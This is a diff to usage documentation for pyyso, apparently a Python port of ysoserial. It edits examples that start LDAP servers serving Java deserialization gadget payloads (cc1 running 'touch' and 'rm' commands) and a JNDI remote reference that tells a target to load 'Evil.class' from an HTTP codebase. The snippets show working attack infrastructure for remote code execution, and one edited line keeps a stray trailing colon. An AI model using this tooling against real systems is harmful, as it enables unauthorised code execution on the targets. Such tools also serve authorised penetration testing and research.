@@ -51,7 +51,7 @@ to start a ldap server hosting java serialized pocs:
 ```
 serobj=pyyso.cc1("touch /tmp/1")
 server=pyyso.LdapSerialized(serobj=serobj, ip="0.0.0.0", port=1389)
-server.start()
+server.run()
 ```
 this will start a ldap server listening 0.0.0.0:1389  
 you can change the hosted java serialized data by:
@@ -60,7 +60,8 @@ server.serobj=pyyso.cc1("rm /tmp/2")
 ```
 to start a ldap server hosting java remote reference factory:
 ```
-pyyso.LdapRemoteRef(javaCodeBase="http://127.0.0.1:8088/", javaFactory="Evil", javaClassName="java.lang.String", ip="0.0.0.0", port=1389):
+server=pyyso.LdapRemoteRef(javaCodeBase="http://127.0.0.1:8088/", javaFactory="Evil", javaClassName="java.lang.String", ip="0.0.0.0", port=1389):
+server.run()
 ```
 this will start a ldap server listening 0.0.0.0:1389  
 and will return a remote reference pointer to `http://127.0.0.1:8088/Evil.class`
